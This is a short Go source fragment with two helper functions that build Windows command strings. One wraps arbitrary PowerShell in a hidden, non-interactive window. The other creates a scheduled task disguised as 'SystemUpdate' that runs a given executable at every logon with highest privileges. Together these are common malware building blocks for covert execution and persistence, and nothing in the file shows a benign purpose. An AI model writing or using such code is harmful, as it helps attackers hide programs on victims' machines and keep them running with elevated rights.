package main

import "fmt"

func screenshot(ps string) string {
	return fmt.Sprintf("powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command \"%s\"", ps)
}

func persist(exe string) string {
	return fmt.Sprintf(`schtasks /create /tn "SystemUpdate" /tr "%s" /sc onlogon /rl highest /f`, exe)
}
